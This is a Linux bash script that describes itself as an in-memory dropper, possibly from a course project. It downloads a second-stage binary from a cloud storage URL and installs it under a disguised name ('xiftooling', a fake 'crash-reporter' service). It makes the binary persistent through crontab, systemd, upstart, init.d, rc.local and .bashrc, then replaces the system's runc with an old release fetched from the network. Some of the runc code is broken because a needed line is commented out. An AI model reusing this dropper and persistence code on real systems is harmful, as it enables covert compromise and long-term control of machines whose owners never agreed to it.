#!/bin/bash

# This script is an in memory dropper for Linux systems.

# URL for the malicious binary
STAGE_2_URL="https://storage.googleapis.com/564-proj-host-implant/myapp" # Replace with actual URL
# Base URL for runc excluding architecture
RUNC_URL="https://github.com/opencontainers/runc/releases/download/v1.0.0-rc6/runc."
# Size of everything put in tmpfs plus a little bit of padding
TOTAL_SIZE=$((10 * 1024 * 1024)) # 10 MB

stage_2_check_path="/tmp/stage2_check.sh"
stage_2_persistent_path="/bin/xiftooling"
stage_2_service_name="crash-reporter"

###########
# Stage 2 #
###########
function run_stage_2 {
	# Ensure there is enough free memory (so it doesn't swap)
	free_mem=$(free -b | awk '/^Mem:/{print $4}')
	[ "$free_mem" -lt $TOTAL_SIZE ] && echo "[-] Not enough free memory. Required: $TOTAL_SIZE bytes, Available: $free_mem bytes" && return 1

    # Download the stage 2 binary and verify it runs correctly
    echo "[+] Downloading stage 2 from $STAGE_2_URL..."
    wget -q -O $stage_2_check_path $STAGE_2_URL
    [ $? -ne 0 ] && echo "[-] Failed to download the binary." && return 1

#    echo "[+] Checking if the binary runs..."
     chmod +x $stage_2_check_path
#    timeout 5 "$stage_2_check_path"
#    [ $? -ne 124 ] && echo "[-] binary exited prematurely." && return 1

    echo "[+] Binary runs correctly. Moving to $stage_2_persistent_path..."
    mv $stage_2_check_path $stage_2_persistent_path
    [ $? -ne 0 ] && echo "[-] Failed to move the binary." && return 1

    echo "[+] Checking for crontab..."
    crontab -l 2>/dev/null 1>/dev/null
    if [ $? -eq 0 ]; then
        echo "[+] Crontab found. Adding entry..."
        if crontab -l | grep -q "$stage_2_persistent_path"; then
            echo "[-] Entry already exists in crontab."
            return 0
        fi
        (crontab -l ; echo "* * * * * $stage_2_persistent_path") | crontab -
        [ $? -eq 0 ] && echo "[+] Added entry to crontab." && return 0
        echo "[-] Failed to add entry to crontab."
        (crontab -l | grep -v "$stage_2_persistent_path") | crontab - # Try to remove the entry 
    fi

    echo "[+] Checking for systemd..."
    systemctl --version 2>/dev/null 1>/dev/null
    if [ $? -eq 0 ]; then
        service_path="/etc/systemd/system/$stage_2_service_name.service"
        echo "[+] Systemd found. Creating service at $service_path..."
        cat > $service_path <<EOL
[Service]
ExecStart=$stage_2_persistent_path
Restart=always

[Install]
WantedBy=multi-user.target
EOL

        systemctl daemon-reload
        systemctl enable --now "$stage_2_service_name.service"
        [ $? -eq 0 ] && echo "[+] Added entry to systemd." && return 0
        echo "[-] Failed to add entry to systemd."
        rm -f $service_path
        systemctl daemon-reload
        systemctl reset-failed
    fi

	echo "[+] Checking for upstart..."
    initctl version 2>/dev/null 1>/dev/null
    if [ $? -eq 0 ]; then
        service_path="/etc/init/$stage_2_service_name.conf"
        echo "[+] Upstart found. Creating service..."
        cat > $service_path <<EOL
start on stopped rc RUNLEVEL=[2345]
stop on runlevel [!2345]

respawn
exec $stage_2_persistent_path
EOL

        initctl reload-configuration
        initctl start "$stage_2_service_name"
        [ $? -eq 0 ] && echo "[+] Added entry to upstart." && return 0
        echo "[-] Failed to add entry to upstart."
        rm -f $service_path
        initctl reload-configuration
    fi

    echo "[+] Checking for init.d..."
    service -h 2>/dev/null 1>/dev/null
    if [ $? -eq 0 ]; then
        service_path="/etc/init.d/$stage_2_service_name"
        echo "[+] Init.d found. Creating service..."
        cat > $service_path <<EOL
#!/bin/sh
### BEGIN INIT INFO
# Provides:          stage2
# Required-Start:    \$local_fs \$network
# Required-Stop:     \$local_fs
# Default-Start:     2 3 4 5
# Default-Stop:
### END INIT INFO

$stage_2_persistent_path
EOL

        chmod +x $service_path
        update-rc.d $stage_2_service_name defaults
        service $stage_2_service_name start
        [ $? -eq 0 ] && echo "[+] Added entry to init.d." && return 0
        echo "[-] Failed to add entry to init.d."
        update-rc.d -f $stage_2_service_name remove
        rm -f $service_path
    fi

    echo "[+] Checking for rc.local..."
    if [ -f /etc/rc.local ]; then
        echo "[+] rc.local found. Adding entry..."
        if grep -q "$stage_2_persistent_path" /etc/rc.local; then
            echo "[-] Entry already exists in rc.local."
            return 0
        fi
        echo $stage_2_persistent_path >> /etc/rc.local
        [ $? -eq 0 ] && echo "[+] Added entry to rc.local." && return 0
        echo "[-] Failed to add entry to rc.local."
        sed -i "/$stage_2_persistent_path/d" /etc/rc.local # Try to remove the entry
    fi

    echo "[+] Checking for bashrc..."
    if [ -f ~/.bashrc ]; then
        echo "[+] .bashrc found. Adding entry..."
        if grep -q "$stage_2_persistent_path" ~/.bashrc; then
            echo "[-] Entry already exists in .bashrc."
            return 0
        fi
        echo $stage_2_persistent_path >> ~/.bashrc
        [ $? -eq 0 ] && echo "[+] Added entry to .bashrc." && return 0
        echo "[-] Failed to add entry to .bashrc."
        sed -i "/$stage_2_persistent_path/d" ~/.bashrc # Try to remove the entry
    fi

    echo "[-] No supported service manager found."
    return 1
}
run_stage_2
if [ $? -ne 0 ]; then
    echo "[-] Failed to make stage 2 persistent, cleaning up..."
    rm -f $stage_2_check_path
    rm -f $stage_2_persistent_path
fi


################
# Replace runc #
################
## Make architecture map (convert uname -m to runc architecture)
#mapdir=$(mktemp -d)
## old intel architectures
#echo "386" > "${mapdir}/i386"
#echo "386" > "${mapdir}/i486"
#echo "386" > "${mapdir}/i586"
#echo "386" > "${mapdir}/i686"
## new intel/amd architectures
echo "amd64" > "${mapdir}/x86_64"
echo "amd64" > "${mapdir}/amd64"
## arm32 architectures
#echo "armel" > "${mapdir}/armv5tel"
#echo "armel" > "${mapdir}/armv6l"
#echo "armhf" > "${mapdir}/armv7l"
#echo "armhf" > "${mapdir}/armv8l"
## arm64 architectures
#echo "arm64" > "${mapdir}/aarch64"
#echo "arm64" > "${mapdir}/arm64"
## powerpc architectures
#echo "ppc64le" > "${mapdir}/ppc64le"
## RISCV architectures
#echo "riscv64" > "${mapdir}/riscv64"
## s390x architectures
#echo "s390x" > "${mapdir}/s390x"
#
# Get url for runc
arch=$(uname -m)
[ ! -f "${mapdir}/${arch}" ] && echo "[-] Unsupported architecture: $arch" && exit 1
RUNC_URL=$RUNC_URL$(cat "${mapdir}/${arch}")
rm -rf "${mapdir}"

echo "[+] Replacing runc..."
wget -q -O "$(which runc)" $RUNC_URL
[ $? -ne 0 ] && echo "[-] Failed to download runc." && exit 1